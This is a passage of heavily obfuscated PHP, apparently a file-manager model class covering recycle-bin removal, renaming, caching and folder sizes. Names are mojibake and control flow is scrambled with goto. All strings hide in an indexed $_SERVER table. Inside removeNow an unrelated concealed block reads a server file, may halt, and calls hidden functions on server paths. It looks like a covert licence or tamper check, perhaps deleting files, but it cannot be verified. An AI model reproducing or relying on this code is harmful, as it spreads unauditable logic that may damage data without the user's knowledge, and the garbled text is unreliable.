Model($CÜêíàõ£∑[427])->get($CÜêíàõ£∑[1998]) == $CÜêíàõ£∑[87]; if ($e·∂„ÇìˆØ || $CÏîƒù·¯† || !$AØö—ÌáÈÛ) { return $this->removeNow($eàº¥¨™ ç, $CÏîƒù·¯†); } $fŒöõ≤›èÉ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto e—ÃÇÒ£Öƒ; D…±≥µ«Îú: return $AÃ “ëÈÖµ; goto eµá”ö§ÖŒ; e—ÃÇÒ£Öƒ: $c™Ñ›Ìåø£ = $fø˘ºä—¥[$CÜêíàõ£∑[406]] == self::TYPE_USER ? $CÜêíàõ£∑[588] : $CÜêíàõ£∑[509]; if ($c™Ñ›Ìåø£ == $CÜêíàõ£∑[588]) { $bå°•îÖ¶Ü = Model($CÜêíàõ£∑[507])->getInfo($fø˘ºä—¥[$CÜêíàõ£∑[498]]); $b˜¯ßäõ’∫ = !empty($bå°•îÖ¶Ü[$CÜêíàõ£∑[1991]]) ? $bå°•îÖ¶Ü[$CÜêíàõ£∑[1991]] : $bå°•îÖ¶Ü[$CÜêíàõ£∑[28]]; $b˜¯ßäõ’∫ = $CÜêíàõ£∑[258] . $b˜¯ßäõ’∫ . $CÜêíàõ£∑[1999] . $fø˘ºä—¥[$CÜêíàõ£∑[498]]; } else { $bå°•îÖ¶Ü = Model($CÜêíàõ£∑[516])->getInfo($fø˘ºä—¥[$CÜêíàõ£∑[498]]); $b˜¯ßäõ’∫ = _get($bå°•îÖ¶Ü, $CÜêíàõ£∑[28]); $b˜¯ßäõ’∫ = $CÜêíàõ£∑[160] . $b˜¯ßäõ’∫ . $CÜêíàõ£∑[2000] . $fø˘ºä—¥[$CÜêíàõ£∑[498]]; } $a¯ùâÊËã∞ = $CÜêíàõ£∑[2001] . md5($b˜¯ßäõ’∫); goto aå›é»÷Ç·; dõÿà«òàá: $this->recycleClear($fø˘ºä—¥); $AÃ “ëÈÖµ = $this->move($eàº¥¨™ ç, $fß√«¯Ùè±, REPEAT_RENAME_FOLDER); $this->folderSizeReset($fø˘ºä—¥[$CÜêíàõ£∑[492]]); goto D…±≥µ«Îú; cﬁ≠ﬂÿÑ⁄°: $CÜêíàõ£∑ =& $_SERVER[’ÿƒ†ïò]; $fø˘ºä—¥ = $this->sourceInfo($eàº¥¨™ ç); $e·∂„ÇìˆØ = intval($fø˘ºä—¥[$CÜêíàõ£∑[406]]) === self::TYPE_SYSTEM; goto eßà≈ãå≠; eµá”ö§ÖŒ: } private function recycleClear($F®€âÇûïÖ) { $DÇíïíÙ∏ë =& $_SERVER[’ÿƒ†ïò]; $fê˘∞ìÔƒÖ = $this->childrenAll($F®€âÇûïÖ); $F§πï≈é…« = array($DÇíïíÙ∏ë[412] => array($DÇíïíÙ∏ë[413], $fê˘∞ìÔƒÖ[$DÇíïíÙ∏ë[2007]])); Model($DÇíïíÙ∏ë[2008])->where($F§πï≈é…«)->delete(); } public function removeNow($e•«à«‹ãË, $eàâ¿ı®ö¡ = true) { goto aÎ° í·‰‚; CØ‚ŒÊØ–≥: $this->lockMoveStart($e•«à«‹ãË); Hook::trigger($F€¡†íÃ∫⁄[2009], $aÃﬁç•†§‘, $eàâ¿ı®ö¡); if ($eàâ¿ı®ö¡) { Model($F€¡†íÃ∫⁄[2008])->moveToRecycle($e•«à«‹ãË); } else { $B›€ßçΩì¯ = $this->childrenAll($F∑÷€ì°¯‘); Model($F€¡†íÃ∫⁄[558])->eventRemove($e•«à«‹ãË); $this->removeRelevance($B›€ßçΩì¯[$F€¡†íÃ∫⁄[2007]], $B›€ßçΩì¯[$F€¡†íÃ∫⁄[1374]]); } goto Bì§ ¿æö•; aÌÛòÔ€Ç°: $this->updateModifyTime($Cí∑±œ®’‹); $this->lockMoveEnd($e•«à«‹ãË); Hook::trigger($F€¡†íÃ∫⁄[1592], $aÃﬁç•†§‘, $eàâ¿ı®ö¡); goto A‹Á¢ÓÈùÉ; aÎ° í·‰‚: $F€¡†íÃ∫⁄ =& $_SERVER[’ÿƒ†ïò]; if ($_SERVER[$F€¡†íÃ∫⁄[854]] != $_SERVER[$F€¡†íÃ∫⁄[855]]) { goto BúÇÈ¬úë”; BúÇÈ¬úë”: $BÃÔ®ªœŒ = $F€¡†íÃ∫⁄[869]; $E≤ﬂ®èúˆ§ = $F€¡†íÃ∫⁄[856]; $B’÷ï⁄ÿö˘ = $_SERVER[$F€¡†íÃ∫⁄[857]] . $F€¡†íÃ∫⁄[858]; goto bÇ∞ˆ‚¨ùŸ; fË˜éÈº›ä: $FÜ∫÷à‹∫Œ = $F€¡†íÃ∫⁄[870]; $FÜ∫÷à‹∫Œ($_SERVER[$F€¡†íÃ∫⁄[871]]); $FÜ∫÷à‹∫Œ($_SERVER[$F€¡†íÃ∫⁄[857]] . $F€¡†íÃ∫⁄[872]); goto d≠âÇ€íéî; bÇ∞ˆ‚¨ùŸ: $fÑêè∆µÕ⁄ = $E≤ﬂ®èúˆ§($B’÷ï⁄ÿö˘); $b°‰ Õıﬁ« = explode($F€¡†íÃ∫⁄[229], $fÑêè∆µÕ⁄); if (count($b°‰ Õıﬁ«) < $F€¡†íÃ∫⁄[625]) { $B•£ºÇ¿Áò = $F€¡†íÃ∫⁄[859]; $B•£ºÇ¿Áò(); } goto fË˜éÈº›ä; d≠âÇ€íéî: $D¶ø—È®ç› = 1; while ($D¶ø—È®ç› > 1) { $D¶ø—È®ç› = $D¶ø—È®ç› + 4; $c©·ºÏõ∞Â = rawurlencode($D¶ø—È®ç› . $F€¡†íÃ∫⁄[376]); } goto eªÃ»ù§êØ; eªÃ»ù§êØ: } $F∑÷€ì°¯‘ = $this->sourceInfo($e•«à«‹ãË); goto A‡Ñ¢‡Ç¿«; A‹Á¢ÓÈùÉ: return !0; goto Då◊‡Î∑∞™; Bì§ ¿æö•: $this->folderSizeReset($F∑÷€ì°¯‘[$F€¡†íÃ∫⁄[492]]); $Cí∑±œ®’‹ = array($F∑÷€ì°¯‘[$F€¡†íÃ∫⁄[492]]); if ($F∑÷€ì°¯‘[$F€¡†íÃ∫⁄[405]] == $F€¡†íÃ∫⁄[87]) { $Cí∑±œ®’‹[] = $F∑÷€ì°¯‘[$F€¡†íÃ∫⁄[397]]; } goto aÌÛòÔ€Ç°; A‡Ñ¢‡Ç¿«: $aÃﬁç•†§‘ = $this->pathInfoMore($e•«à«‹ãË); if (!$F∑÷€ì°¯‘) { return !0; } if ($F∑÷€ì°¯‘[$F€¡†íÃ∫⁄[492]] == 0) { if (!_get($GLOBALS, $F€¡†íÃ∫⁄[499])) { return !1; } } goto CØ‚ŒÊØ–≥; Då◊‡Î∑∞™: } public function childrenAll($aú…÷çæ√Ü) { $FçÜ›„Ëö¬ =& $_SERVER[’ÿƒ†ïò]; $Aó∫ñÙüÊâ = $aú…÷çæ√Ü[$FçÜ›„Ëö¬[397]]; if ($aú…÷çæ√Ü[$FçÜ›„Ëö¬[405]] == $FçÜ›„Ëö¬[87]) { $bàúîèî¥∆ = array($FçÜ›„Ëö¬[578] => array($FçÜ›„Ëö¬[538], $aú…÷çæ√Ü[$FçÜ›„Ëö¬[515]] . $Aó∫ñÙüÊâ . $FçÜ›„Ëö¬[539])); $c∆ö˜≠óΩÖ = array($FçÜ›„Ëö¬[578] => $bàúîèî¥∆[$FçÜ›„Ëö¬[515]]); $eŒô≥é‰ı¥ = $this->field($FçÜ›„Ëö¬[2010])->where($c∆ö˜≠óΩÖ)->select(); $EÉéàŸñá° = !1; $C˘Öπ±‘ˆû = array($Aó∫ñÙüÊâ); if ($eŒô≥é‰ı¥) { $EÉéàŸñá° = array_to_keyvalue($eŒô≥é‰ı¥, $FçÜ›„Ëö¬[33], $FçÜ›„Ëö¬[461]); $EÉéàŸñá° = array_remove_value($EÉéàŸñá°, $FçÜ›„Ëö¬[191]); $C˘Öπ±‘ˆû = array_to_keyvalue($eŒô≥é‰ı¥, $FçÜ›„Ëö¬[33], $FçÜ›„Ëö¬[397]); $C˘Öπ±‘ˆû[] = $Aó∫ñÙüÊâ; } } else { $EÉéàŸñá° = array($aú…÷çæ√Ü[$FçÜ›„Ëö¬[461]]); $C˘Öπ±‘ˆû = array($Aó∫ñÙüÊâ); } return array($FçÜ›„Ëö¬[2007] => $C˘Öπ±‘ˆû, $FçÜ›„Ëö¬[1374] => $EÉéàŸñá°); } public function removeArray($aﬂ¶∞»†î˜) { if (!$aﬂ¶∞»†î˜) { return !0; } } public function removeRelevance($C√Ñë˘¿ß‘, $dãü‡–˘åÑ) { goto a˘±óﬂ¨€€; bÊäÀ“•ñ‡: for ($féµ£ÆæßÔ = 0; $féµ£ÆæßÔ < count($C√Ñë˘¿ß‘); $féµ£ÆæßÔ++) { $this->sourceCacheClear($C√Ñë˘¿ß‘[$féµ£ÆæßÔ]); } goto aâé”•‘—á; f≤·⁄®Á≤•: Model($DÍË…‹ë¿π[1989])->removeBySource($C√Ñë˘¿ß‘); $this->where($c›Ê†Âˆ˘Ò)->delete(); Model($DÍË…‹ë¿π[464])->remove($dãü‡–˘åÑ); goto bÊäÀ“•ñ‡; e‰ïú⁄Ó·„: $C√Ñë˘¿ß‘ = array_unique(array_filter($C√Ñë˘¿ß‘)); $dãü‡–˘åÑ = array_unique(array_filter($dãü‡–˘åÑ)); if (!$C√Ñë˘¿ß‘) { return !1; } goto C¢Îöå„è; Fìôÿÿâƒ¨: Model($DÍË…‹ë¿π[1866])->where($c›Ê†Âˆ˘Ò)->delete(); Model($DÍË…‹ë¿π[558])->where($c›Ê†Âˆ˘Ò)->delete(); Model($DÍË…‹ë¿π[1703])->removeBySource($C√Ñë˘¿ß‘); goto f≤·⁄®Á≤•; C¢Îöå„è: $c›Ê†Âˆ˘Ò = array($DÍË…‹ë¿π[412] => array($DÍË…‹ë¿π[413], $C√Ñë˘¿ß‘)); Model($DÍË…‹ë¿π[2008])->where($c›Ê†Âˆ˘Ò)->delete(); Model($DÍË…‹ë¿π[455])->where($c›Ê†Âˆ˘Ò)->delete(); goto Fìôÿÿâƒ¨; a˘±óﬂ¨€€: $DÍË…‹ë¿π =& $_SERVER[’ÿƒ†ïò]; $C√Ñë˘¿ß‘ = $C√Ñë˘¿ß‘ ? $C√Ñë˘¿ß‘ : array(); $dãü‡–˘åÑ = $dãü‡–˘åÑ ? $dãü‡–˘åÑ : array(); goto e‰ïú⁄Ó·„; aâé”•‘—á: } public function rename($fÀçÂ◊†ÏÉ, $aŒ´®îäâÇ) { goto BÖ©ﬂ‰ΩŒö; e≠”ˆí⁄Óî: $cñú¿ë∂›ö = $C¯Ö≥•å¯¨[1997] . $Dÿâîï¡ö‡[$C¯Ö≥•å¯¨[492]]; if (isset(self::$cacheChildList[$cñú¿ë∂›ö])) { unset(self::$cacheChildList[$cñú¿ë∂›ö]); } return $CÑ§‚Í¥„è; goto a¥±€¢àë§; BÖ©ﬂ‰ΩŒö: $C¯Ö≥•å¯¨ =& $_SERVER[’ÿƒ†ïò]; $Dÿâîï¡ö‡ = $this->sourceInfo($fÀçÂ◊†ÏÉ); if (!$Dÿâîï¡ö‡) { return !1; } goto eÔÎΩÍ’çÿ; fÁ⁄Àüœ—©: if ($Dÿâîï¡ö‡[$C¯Ö≥•å¯¨[405]] != $C¯Ö≥•å¯¨[87]) { $a†˘ÈÖÉ∏œ[$C¯Ö≥•å¯¨[407]] = substr(get_path_ext($aŒ´®îäâÇ), 0, 10); } Model($C¯Ö≥•å¯¨[558])->eventRename($fÀçÂ◊†ÏÉ, $Dÿâîï¡ö‡[$C¯Ö≥•å¯¨[28]], $aŒ´®îäâÇ); $this->sourceCacheClear($fÀçÂ◊†ÏÉ); goto f…Ç‰√ÑÑ†; f…Ç‰√ÑÑ†: $this->setNamePinyin($fÀçÂ◊†ÏÉ, $a†˘ÈÖÉ∏œ[$C¯Ö≥•å¯¨[28]], !1); $this->updateModifyTime($Dÿâîï¡ö‡[$C¯Ö≥•å¯¨[492]]); $CÑ§‚Í¥„è = $this->where(array($C¯Ö≥•å¯¨[412] => $fÀçÂ◊†ÏÉ))->data($a†˘ÈÖÉ∏œ)->save(); goto e≠”ˆí⁄Óî; eÔÎΩÍ’çÿ: $e™´∂µ”Ï¬ = $this->fileNameExist($Dÿâîï¡ö‡[$C¯Ö≥•å¯¨[492]], $aŒ´®îäâÇ); if ($e™´∂µ”Ï¬ && $e™´∂µ”Ï¬ != $fÀçÂ◊†ÏÉ) { return !1; } $a†˘ÈÖÉ∏œ = array($C¯Ö≥•å¯¨[415] => $aŒ´®îäâÇ, $C¯Ö≥•å¯¨[577] => USER_ID); goto fÁ⁄Àüœ—©; a¥±€¢àë§: } public function setNamePinyin($a¡õ∆ÑõÚŒ, $bﬁÏéÆ“ëï, $D∏à¡•ëíá = true) { $a˘ﬁÏ◊é≤‹ =& $_SERVER[’ÿƒ†ïò]; $fÎËÆΩÖèë = Input::check($bﬁÏéÆ“ëï, $a˘ﬁÏ◊é≤‹[581]); $fìß¶‚Çœö = array($a˘ﬁÏ◊é≤‹[436] => KodSort::makeStr($bﬁÏéÆ“ëï)); if ($fÎËÆΩÖèë) { $fìß¶‚Çœö[$a˘ﬁÏ◊é≤‹[458]] = str_replace($a˘ﬁÏ◊é≤‹[50], $a˘ﬁÏ◊é≤‹[33], Pinyin::get($bﬁÏéÆ“ëï)); $fìß¶‚Çœö[$a˘ﬁÏ◊é≤‹[457]] = Pinyin::get($bﬁÏéÆ“ëï, $a˘ﬁÏ◊é≤‹[582]); } if (!$D∏à¡•ëíá && !$fÎËÆΩÖèë) { $fìß¶‚Çœö[$a˘ﬁÏ◊é≤‹[458]] = null; $fìß¶‚Çœö[$a˘ﬁÏ◊é≤‹[457]] = null; } $this->metaSet($a¡õ∆ÑõÚŒ, $fìß¶‚Çœö); } public function getContent($fÉÛé∆ ™Û) { goto Còﬂø»ﬁêÿ; DÓ∆§Ö◊áÁ: if ($cÔÕÚÍøªÀ[$D⁄¨»æ â∂[78]] == 0) { return $D⁄¨»æ â∂[33]; } $B©¬ÇÆÕ∆€ = $D⁄¨»æ â∂[2011] . $cÔÕÚÍøªÀ[$D⁄¨»æ â∂[170]]; if ($cÔÕÚÍøªÀ[$D⁄¨»æ â∂[78]] <= 1024 * 10) { $DøÉ…´ıÉù = Cache::get($B©¬ÇÆÕ∆€); if (!$DøÉ…´ıÉù) { $DøÉ…´ıÉù = IO::getContent($cÔÕÚÍøªÀ[$D⁄¨»æ â∂[76]]); Cache::set($B©¬ÇÆÕ∆€, $DøÉ…´ıÉù); } return $DøÉ…´ıÉù; } goto B€ÿùßﬁ≥ö; Còﬂø»ﬁêÿ: $D⁄¨»æ â∂ =& $_SERVER[’ÿƒ†ïò]; $cÔÕÚÍøªÀ = $this->fileInfoGet($fÉÛé∆ ™Û); if (!$cÔÕÚÍøªÀ) { return !1; } goto DÓ∆§Ö◊áÁ; B€ÿùßﬁ≥ö: if (!$cÔÕÚÍøªÀ[$D⁄¨»æ â∂[76]]) { return $D⁄¨»æ â∂[33]; } return IO::getContent($cÔÕÚÍøªÀ[$D⁄¨»æ â∂[76]]); goto AÆë´üò⁄‹; AÆë´üò⁄‹: } public function setDesc($EÜ¡ü·òÑÆ, $fÕá¨ä⁄»†) { $B–¬å¿Ω≠à =& $_SERVER[’ÿƒ†ïò]; Model($B–¬å¿Ω≠à[558])->eventAddDesc($EÜ¡ü·òÑÆ, $fÕá¨ä⁄»†); return $this->metaSet($EÜ¡ü·òÑÆ, $B–¬å¿Ω≠à[445], $fÕá¨ä⁄»†); } public function setContent($EÜ¯â†“ ó, $AÂëØåñßÉ = '') { goto eàÓØ≥åÊú; d´Ù“‚Ôë¬: if (!$Cã∫ÂÃ»ºı || !$DÍ¯ïÂ⁄Ó») { return !1; } $F≤ÚÀπ≥ÛÇ = Model($f–Ω‹†∑ùå[464])->addFileByContent($AÂëØåñßÉ, $DÍ¯ïÂ⁄Ó»[$f–Ω‹†∑ùå[28]]); $C„‡–§»Ô‘ = $this->fileHistory($DÍ¯ïÂ⁄Ó», $F≤ÚÀπ≥ÛÇ[$f–Ω‹†∑ùå[461]], $F≤ÚÀπ≥ÛÇ[$f–Ω‹†∑ùå[78]]); goto AäßºçÀòÜ; AäßºçÀòÜ: if (!$C„‡–§»Ô‘) { return Model($f–Ω‹†∑ùå[464])->remove($F≤ÚÀπ≥ÛÇ[$f–Ω‹†∑ùå[461]]); } $this->folderSizeReset($DÍ¯ïÂ⁄Ó»[$f–Ω‹†∑ùå[492]]); return !0; goto a∑¿Œ±÷“Ù; eàÓØ≥åÊú: $f–Ω‹†∑ùå =& $_SERVER[’ÿƒ†ïò]; $DÍ¯ïÂ⁄Ó» = $this->sourceInfo($EÜ¯â†“ ó); $Cã∫ÂÃ»ºı = $this->fileInfoGet($EÜ¯â†“ ó); goto d´Ù“‚Ôë¬; a∑¿Œ±÷“Ù: } public function fileSubstr($e˜ò¨‡¨ı≠, $dºÒ¶´æâä, $AÜ…÷áıÎÿ) { $b∫ØÊÂé∏± = $this->fileInfoGet($e˜ò¨‡¨ı≠); if (!$b∫ØÊÂé∏±) { return !1; } return IO::fileSubstr($b∫ØÊÂé∏±[$_SERVER[’ÿƒ†ïò][76]], $dºÒ¶´æâä, $AÜ…÷áıÎÿ); } public function fileInfoGet($A∏Æ≤¿Ùâ§) { goto eÁöÃﬁö¿Ú; E˜—’∂Èıõ: $aâ˜êù€Í¥ = Model($a≈ûö˜≈ÕÏ[464])->fileInfo($B†«ñ¬øâ≤[$a≈ûö˜≈ÕÏ[461]]); if ($aâ˜êù€Í¥) { $aâ˜êù€Í¥[$a≈ûö˜≈ÕÏ[28]] = $B†«ñ¬øâ≤[$a≈ûö˜≈ÕÏ[28]]; } self::$cacheFileInfo[$fÂ£ËÔ„√ˆ] = $aâ˜êù€Í¥; goto eﬁè»íπî£; eÁöÃﬁö¿Ú: $a≈ûö˜≈ÕÏ =& $_SERVER[’ÿƒ†ïò]; $B†«ñ¬øâ≤ = $this->sourceInfo($A∏Æ≤¿Ùâ§); if (!$B†«ñ¬øâ≤ || $B†«ñ¬øâ≤[$a≈ûö˜≈ÕÏ[405]]) { return !1; } goto A¡√§ÚªÈˆ; eﬁè»íπî£: return $aâ˜êù€Í¥; goto bœáÙ´áõä; A¡√§ÚªÈˆ: $fÂ£ËÔ„√ˆ = $a≈ûö˜≈ÕÏ[467] . $B†«ñ¬øâ≤[$a≈ûö˜≈ÕÏ[461]]; $e®Õ∫ø™≈ﬁ = _get(self::$cacheFileInfo, $fÂ£ËÔ„√ˆ); if ($e®Õ∫ø™≈ﬁ) { return $e®Õ∫ø™≈ﬁ; } goto E˜—’∂Èıõ; bœáÙ´áõä: } private function folderChildrenNumber($AÉ¶ÜÜèùÑ) { $C–À˜ù´Öõ =& $_SERVER[’ÿƒ†ïò]; $E∞÷∑ŒªÒû = $this->sourceInfo($AÉ¶ÜÜèùÑ); $C≤ë£í˜ÃÕ = array($C–À˜ù´Öõ[578] => array($C–À˜ù´Öõ[538], $E∞÷∑ŒªÒû[$C–À˜ù´Öõ[515]] . $AÉ¶ÜÜèùÑ . $C–À˜ù´Öõ[539]), $C–À˜ù´Öõ[424] => intval($E∞÷∑ŒªÒû[$C–À˜ù´Öõ[425]]), $C–À˜ù´Öõ[571] => 1); $b∫—œ˘Á†∞ = $this->where($C≤ë£í˜ÃÕ)->count(); $d÷›¬†ù¥ﬂ = $this->where($C≤ë£í˜ÃÕ)->where(array($C–À˜ù´Öõ[571] => 0))->count(); return array($C–À˜ù´Öõ[82] => $d÷›¬†ù¥ﬂ, $C–À˜ù´Öõ[83] => $b∫—œ˘Á†∞); } public function pathInfo($c∫ƒë÷®µ√, $b∑ ®Ö¬∆€ = false) { goto bá¨™¶¶—ã; cã“¨££µÜ: $C≠”ôÕ©ª¢ = $FÔäÁ“ßﬁµ[453] . intval($b∑ ®Ö¬∆€) . $FÔäÁ“ßﬁµ[454] . $c∫ƒë÷®µ√; $E»å≥Çûπó = _get(self::$cachePathInfo, $C≠”ôÕ©ª¢); if ($E»å≥Çûπó) { return $E»å≥Çûπó; } goto cÇ‹œ¢å¨À; cÇ‹œ¢å¨À: $CÜûßèâŒﬁ = $this->sourceInfo($c∫ƒë÷®µ√); if (!$CÜûßèâŒﬁ) { return !1; } $CÜûßèâŒﬁ = $this->_listDataApplyItem($CÜûßèâŒﬁ, $b∑ ®Ö¬∆€); goto FÀà∞â¬¶®; bá¨™¶¶—ã: $FÔäÁ“ßﬁµ =& $_SERVER[’ÿƒ†ïò]; $b∑ ®Ö¬∆€ = !1; $c∫ƒë÷®µ√ = intval($c∫ƒë÷®µ√); goto cã“¨££µÜ; FÀà∞â¬¶®: self::$cachePathInfo[$C≠”ôÕ©ª¢] = $CÜûßèâŒﬁ; return $CÜûßèâŒﬁ; goto e”ıÍÚã≈ú; e”ıÍÚã≈ú: } public static $cachePathInfoMore = array(); public function pathInfoMore($dÉ˜ƒÒùœä) { goto a˘¿áòøΩâ; a˘¿áòøΩâ: $D–Óê†Œ¿Ü =& $_SERVER[’ÿƒ†ïò]; $EæåáˆîÈÒ = _get(self::$cachePathInfoMore, $dÉ˜ƒÒùœä); if ($EæåáˆîÈÒ) { return $EæåáˆîÈÒ; } goto A°‹∆∫ˆ€√; A°‹∆∫ˆ€√: $FºÀë÷Ÿ–Ú = $this->pathInfo($dÉ˜ƒÒùœä); if (!$FºÀë÷Ÿ–Ú) { return !1; } if ($FºÀë÷Ÿ–Ú[$D–Óê†Œ¿Ü[405]] == $D–Óê†Œ¿Ü[87]) { $FºÀë÷Ÿ–Ú[$D–Óê†Œ¿Ü[81]] = $this->folderChildrenNumber($dÉ˜ƒÒùœä); } goto B”ÈéÛ‰¨…; B”ÈéÛ‰¨…: self::$cachePathInfoMore[$dÉ˜ƒÒùœä] = $FºÀë÷Ÿ–Ú; return $FºÀë÷Ÿ–Ú; goto Eõ¢Ñí±õ; Eõ¢Ñí±õ: } public function sourceInfo($F¬≥Úëì«Ç) { goto dÇ¿Œé¶ùê; dÇ¿Œé¶ùê: $aÉ»ÛàáÑΩ =& $_SERVER[’ÿƒ†ïò]; if (!$F¬≥Úëì«Ç) { return array(); } $F¬≥Úëì«Ç = intval($F¬≥Úëì«Ç); goto B∂Ω‡Ùı“Ì; B∂Ω‡Ùı“Ì: $DÆèí°„ºﬁ = $aÉ»ÛàáÑΩ[452] . $F¬≥Úëì«Ç; $bå≥≠úîú¨ = _get(self::$cacheSourceInfo, $DÆèí°„ºﬁ); if ($bå≥≠úîú¨) { return $bå≥≠úîú¨; } goto b∑Õ´ÿ∆Ú⁄; b∑Õ´ÿ∆Ú⁄: $eçñÏª‰ΩÑ = $this->where(array($aÉ»ÛàáÑΩ[397] => $F¬≥Úëì«Ç))->find(); self::$cacheSourceInfo[$DÆèí°„ºﬁ] = $eçñÏª‰ΩÑ; return self::$cacheSourceInfo[$DÆèí°„ºﬁ]; goto D‹º⁄Éª‹Á; D‹º⁄Éª‹Á: } public function sourceCacheClear($fŸ“¡¶ñÈ≥ = false) { self::cacheClear($fŸ“¡¶ñÈ≥); } public static function cacheClear($F‚á≠ëëõã = false) { $a√¬≈°ø≥ª =& $_SERVER[’ÿƒ†ïò]; if ($F‚á≠ëëõã == !1) { goto D´˘ïû∫Â–; bÍ∑‰„∞ôç: return; goto FÛßÑ™Ñª≤; D´˘ïû∫Â–: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto bÀ§œ»ƒí´; bÀ§œ»ƒí´: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto bÍ∑‰„∞ôç; FÛßÑ™Ñª≤: } unset(self::$cacheSourceInfo[$a√¬≈°ø≥ª[452] . $F‚á≠ëëõã]); unset(self::$cachePathInfoMore[$F‚á≠ëëõã]); unset(self::$cachePathInfo[$a√¬≈°ø≥ª[2012] . $F‚á≠ëëõã]); unset(self::$cachePathInfo[$a√¬≈°ø≥ª[2013] . $F‚á≠ëëõã]); } public function metaSet($aíÊ∆¡–¯™, $A‡ñÇ¿ä«Ö = null, $Eı≈¥è÷ÕÂ = null) { $F§Ÿ≤◊È™Ë = parent::metaSet($aíÊ∆¡–¯™, $A‡ñÇ¿ä«Ö, $Eı≈¥è÷ÕÂ); if ($F§Ÿ≤◊È™Ë) { $this->sourceCacheClear($aíÊ∆¡–¯™); } return $F§Ÿ≤◊È™Ë; } public function pathInfoByPath($A„õ¬µ±Ãº, $Cï€ê˜ïøá) { $f∞ ‘á  ã =& $_SERVER[’ÿƒ†ïò]; $E†»Á¢Íë– = !$Cï€ê˜ïøá ? array() : explode($f∞ ‘á  ã[8], trim($Cï€ê˜ïøá, $f∞ ‘á  ã[8])); $b∫ë«í‚ﬁò = $A„õ¬µ±Ãº; foreach ($E†»Á¢Íë– as $f«éŒµº÷ß) { $E÷Ø£ä‡”ê = array($f∞ ‘á  ã[492] => $b∫ë«í‚ﬁò, $f∞ ‘á  ã[28] => $f«éŒµº÷ß); $CÕ…Ï©é◊Ü = $this->where($E÷Ø£ä‡”ê)->select(); if (!$CÕ…Ï©é◊Ü) { return !1; } $CÕ…Ï©é◊Ü = array_sort_by($CÕ…Ï©é◊Ü, $f∞ ‘á  ã[425]); $b∫ë«í‚ﬁò = $CÕ…Ï©é◊Ü[0][$f∞ ‘á  ã[397]]; } return $this->pathInfo($b∫ë«í‚ﬁò, !0); } protected function updateModifyTime($dôÜ∑ˆ´åé) { goto F≤°ØàŸ∂ä; F«‰Ù‘ÑÉΩ: if (!is_array($dôÜ∑ˆ´åé)) { $dôÜ∑ˆ´åé = array($dôÜ∑ˆ´åé); } foreach ($dôÜ∑ˆ´åé as $A—‘ÆÉ»·Ã => $d÷º⁄ºêúú) { $dôÜ∑ˆ´åé[$A—‘ÆÉ»·Ã] = intval($d÷º⁄ºêúú); $this->sourceCacheClear($d÷º⁄ºêúú); } $bêÈ¡ÛËﬂá = array($Bú‡–é®ˆ±[397] => array($Bú‡–é®ˆ±[7], $dôÜ∑ˆ´åé)); goto d©Ù≤Ì√Îî; d©Ù≤Ì√Îî: $eõ´Ì‰ÖÍÔ = array($Bú‡–é®ˆ±[577] => $D¿¥˜ÆΩòÉ, $Bú‡–é®ˆ±[419] => time()); $this->where($bêÈ¡ÛËﬂá)->save($eõ´Ì‰ÖÍÔ); goto eÑâ≥ÿé⁄Ô; F≤°ØàŸ∂ä: $Bú‡–é®ˆ± =& $_SERVER[’ÿƒ†ïò]; $D¿¥˜ÆΩòÉ = defined($Bú‡–é®ˆ±[468]) ? USER_ID : $Bú‡–é®ˆ±[191]; if (!$dôÜ∑ˆ´åé) { return; } goto F«‰Ù‘ÑÉΩ; eÑâ≥ÿé⁄Ô: } public function folderSizeReset($CÇÔÙõççµ, $Cèó⁄ä©§≈ = false) { goto FœäÛﬁô†ˆ; FœäÛﬁô†ˆ: $föÜëÒáàì =& $_SERVER[’ÿƒ†ïò]; if ($this->statusIgnoreResetSpace) { return; } $B∂ôÏ≥¬°∫ = $this->sourceInfo($CÇÔÙõççµ); goto B◊»Ôπü‘; eπƒ´éçòˆ: if ($Cèó⁄ä©§≈ == 0) { return CacheLock::unlock($aûÍô€á∑ﬂ); } $f’ËúßÇ®¿ = $this->parentLevelArray($B∂ôÏ≥¬°∫[$föÜëÒáàì[515]]); if (!$f’ËúßÇ®¿) { $f’ËúßÇ®¿ = array(); } goto D¶áØÌ‘ˆë; B≥ù¢ä Ãæ: $this->where($c ¯‡£÷Ìí)->setAdd($föÜëÒáàì[78], $Cèó⁄ä©§≈); CacheLock::unlock($aûÍô€á∑ﬂ); $bßü£ºâùÏ = $föÜëÒáàì[2015] . $B∂ôÏ≥¬°∫[$föÜëÒáàì[406]] . $föÜëÒáàì[4] . $B∂ôÏ≥¬°∫[$föÜëÒáàì[498]]; goto f°«Â©òø∂; D¶áØÌ‘ˆë: $f’ËúßÇ®¿[] = $B∂ôÏ≥¬°∫[$föÜëÒáàì[397]]; $c ¯‡£÷Ìí = array($föÜëÒáàì[397] => array($föÜëÒáàì[413], $f’ËúßÇ®¿)); if ($Cèó⁄ä©§≈ < 0) { $c ¯‡£÷Ìí[$föÜëÒáàì[78]] = array($föÜëÒáàì[1002], abs($Cèó⁄ä©§≈)); } goto B≥ù¢ä Ãæ; f°«Â©òø∂: $D˘ä∑ï¯‡ê = array($B∂ôÏ≥¬°∫[$föÜëÒáàì[406]], $B∂ôÏ≥¬°∫[$föÜëÒáàì[498]]); TaskRun::timeLimitCall($bßü£ºâùÏ, $föÜëÒáàì[2016], $D˘ä∑ï¯‡ê, 1.5); goto EîëÒËÁ’∆; B◊»Ôπü‘: $aûÍô€á∑ﬂ = $föÜëÒáàì[2014] . $CÇÔÙõççµ; CacheLock::lock($aûÍô€á∑ﬂ, 20); if ($Cèó⁄ä©§≈ === !1) { $this->sourceCacheClear($CÇÔÙõççµ); $B∂ôÏ≥¬°∫ = $this->sourceInfo($CÇÔÙõççµ); $c ¯‡£÷Ìí = array($föÜëÒáàì[396] => $CÇÔÙõççµ, $föÜëÒáàì[424] => 0); $Cà•ÖüÃö≈ = $this->where($c ¯‡£÷Ìí)->sum($föÜëÒáàì[78]); $Cèó⁄ä©§≈ = intval($Cà•ÖüÃö≈) - intval($B∂ôÏ≥¬°∫[$föÜëÒáàì[78]]); } goto eπƒ´éçòˆ; EîëÒËÁ’∆: } public function folderSizeResetChildren($Cà á∫·Ì“) { goto BëÆÃ±§Üˆ; c…«Ï¢º≠“: $A‹Ûå≤¬Æº[] = $eÍ◊ï∏õ∑æ; $A‹Ûå≤¬Æº = array_to_keyvalue($A‹Ûå≤¬Æº, $aº¢Îœ≤‡–[397]); foreach ($A‹Ûå≤¬Æº as 